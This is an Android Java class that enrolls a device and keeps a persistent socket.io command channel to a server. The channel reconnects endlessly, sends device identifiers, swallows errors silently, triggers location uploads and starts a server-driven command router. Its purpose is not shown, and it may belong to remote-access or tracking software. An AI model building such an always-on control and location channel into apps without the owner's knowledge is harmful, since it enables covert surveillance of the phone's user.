package com.fason.app.core.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;

import com.fason.app.core.FasonApp;
import com.fason.app.core.config.Config;
import com.fason.app.features.gps.LocationSyncWorker;

import org.json.JSONObject;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.TimeUnit;

import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public final class SocketClient {

    private static final int RECONNECT_DELAY = 5000;
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    private static SocketClient instance;
    private volatile Socket socket;
    private ConnectivityManager.NetworkCallback networkCallback;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService credentialExecutor = Executors.newSingleThreadExecutor();
    private final AtomicBoolean initializing = new AtomicBoolean(false);
    private final DeviceCredentialStore credentialStore;
    private final OkHttpClient httpClient;
    private volatile boolean connected = false;
    private volatile boolean stopped = false;

    private SocketClient() {
        credentialStore = new DeviceCredentialStore(FasonApp.getContext());
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build();
        initializeAsync();
        setupNetworkMonitor();
    }

    public static synchronized SocketClient getInstance() {
        if (instance == null) instance = new SocketClient();
        return instance;
    }

    private void initializeAsync() {
        if (stopped || socket != null || !initializing.compareAndSet(false, true)) return;

        credentialExecutor.execute(() -> {
            try {
                String deviceSecret = credentialStore.loadSecret();
                if (deviceSecret == null || deviceSecret.isEmpty()) {
                    deviceSecret = enrollDevice();
                    if (!credentialStore.saveSecret(deviceSecret)) {
                        throw new IllegalStateException("Unable to persist device credential");
                    }
                }
                // The signed APK cannot rewrite itself, but the bootstrap token is
                // never persisted and is cleared from process memory after use.
                Config.clearBootstrapToken();
                installSocket(deviceSecret);
            } catch (Exception ignored) {
                if (!stopped) handler.postDelayed(this::initializeAsync, RECONNECT_DELAY);
            } finally {
                initializing.set(false);
            }
        });
    }

    private String enrollDevice() throws Exception {
        String bootstrapToken = Config.getBootstrapToken();
        if (bootstrapToken == null || bootstrapToken.length() < 32) {
            throw new IllegalStateException("APK has no enrollment token");
        }

        JSONObject body = new JSONObject();
        body.put("bootstrapToken", bootstrapToken);
        body.put("deviceId", getDeviceId());
        body.put("model", Build.MODEL);
        body.put("manufacturer", Build.MANUFACTURER);
        body.put("release", Build.VERSION.RELEASE);

        String baseUrl = Config.getServerUrl().replaceAll("/+$", "");
        Request request = new Request.Builder()
            .url(baseUrl + "/api/device/enroll")
            .header("Cache-Control", "no-store")
            .post(RequestBody.create(body.toString(), JSON))
            .build();

        try (Response response = httpClient.newCall(request).execute()) {
            String responseBody = response.body() != null ? response.body().string() : "";
            if (!response.isSuccessful()) {
                throw new IllegalStateException("Enrollment rejected with HTTP " + response.code());
            }
            String deviceSecret = new JSONObject(responseBody)
                .getJSONObject("data")
                .getString("deviceSecret");
            if (deviceSecret.length() < 32 || deviceSecret.length() > 256) {
                throw new IllegalStateException("Invalid device credential response");
            }
            return deviceSecret;
        }
    }

    private synchronized void installSocket(String deviceSecret) throws Exception {
        if (stopped || socket != null) return;

        String query = String.format("model=%s&manf=%s&release=%s&id=%s",
            encode(Build.MODEL),
            encode(Build.MANUFACTURER),
            encode(Build.VERSION.RELEASE),
            encode(getDeviceId()));
        IO.Options opts = new IO.Options();
        opts.reconnection = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay = RECONNECT_DELAY;
        opts.reconnectionDelayMax = 30000;
        opts.timeout = 30000;
        opts.query = query;
        opts.auth = Collections.singletonMap("token", deviceSecret);
        opts.secure = Config.isHttps();

        Socket newSocket = IO.socket(Config.getServerUrl(), opts);
        newSocket.on(Socket.EVENT_CONNECT, args -> {
            connected = true;
            try {
                LocationSyncWorker.enqueue(FasonApp.getContext());
            } catch (Exception ignored) {}
        });
        newSocket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
        newSocket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
        newSocket.on("credential:rotate", args -> handleCredentialRotation(newSocket, args));
        socket = newSocket;
        handler.post(SocketCommandRouter::initialize);
    }

    private void handleCredentialRotation(Socket sourceSocket, Object[] args) {
        credentialExecutor.execute(() -> {
            try {
                if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
                String newSecret = ((JSONObject) args[0]).optString("deviceSecret", "");
                if (!credentialStore.saveSecret(newSecret)) return;

                sourceSocket.emit("credential:rotate:ack");
                handler.postDelayed(this::rebuildSocketWithStoredCredential, 1000);
            } catch (Exception ignored) {}
        });
    }

    private void rebuildSocketWithStoredCredential() {
        Socket oldSocket = socket;
        if (oldSocket == null || stopped) return;

        SocketCommandRouter.reset();
        oldSocket.off(Socket.EVENT_CONNECT);
        oldSocket.off(Socket.EVENT_DISCONNECT);
        oldSocket.off(Socket.EVENT_CONNECT_ERROR);
        oldSocket.off("credential:rotate");
        try { oldSocket.disconnect(); } catch (Exception ignored) {}
        connected = false;
        socket = null;
        initializeAsync();
    }

    private void setupNetworkMonitor() {
        ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
            .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                handler.postDelayed(() -> {
                    Socket current = socket;
                    if (current == null) {
                        initializeAsync();
                    } else if (!current.connected()) {
                        try { current.connect(); } catch (Exception ignored) {}
                    }
                    try {
                        LocationSyncWorker.enqueue(FasonApp.getContext());
                    } catch (Exception ignored) {}
                }, 1000);
            }
        };

        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    private String getDeviceId() {
        String deviceId = Settings.Secure.getString(
            FasonApp.getContext().getContentResolver(),
            Settings.Secure.ANDROID_ID
        );
        if (deviceId == null || deviceId.isEmpty()) {
            throw new IllegalStateException("ANDROID_ID unavailable");
        }
        return deviceId;
    }

    private String encode(String value) {
        try {
            return URLEncoder.encode(value != null ? value : "", StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return value != null ? value : "";
        }
    }

    public synchronized Socket getSocket() {
        if (stopped) return null;
        Socket s = socket;
        if (s == null) {
            initializeAsync();
        }
        return s;
    }

    /** Emit an event only if the socket is connected. No-op otherwise. */
    public void safeEmit(String event, Object data) {
        Socket s = getSocket();
        if (s != null && s.connected()) {
            try { s.emit(event, data); } catch (Exception ignored) {}
        }
    }

    public boolean isConnected() {
        Socket current = socket;
        return connected && current != null && current.connected();
    }

    public void reconnect() {
        Socket current = socket;
        if (current == null) {
            initializeAsync();
        } else {
            try { current.connect(); } catch (Exception ignored) {}
        }
    }

    public void disconnect() {
        Socket current = socket;
        if (current != null) {
            try { current.disconnect(); } catch (Exception ignored) {}
        }
    }

    /** Full shutdown — disconnects the socket and unregisters the network callback. */
    public void shutdown() {
        stopped = true;
        disconnect();

        Socket current = socket;
        if (current != null) {
            current.off(Socket.EVENT_CONNECT);
            current.off(Socket.EVENT_DISCONNECT);
            current.off(Socket.EVENT_CONNECT_ERROR);
            current.off("credential:rotate");
        }

        if (networkCallback != null) {
            try {
                ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
            networkCallback = null;
        }

        handler.removeCallbacksAndMessages(null);
        credentialExecutor.shutdownNow();
        connected = false;
        socket = null;

        synchronized (SocketClient.class) {
            if (instance == this) instance = null;
        }
    }
}
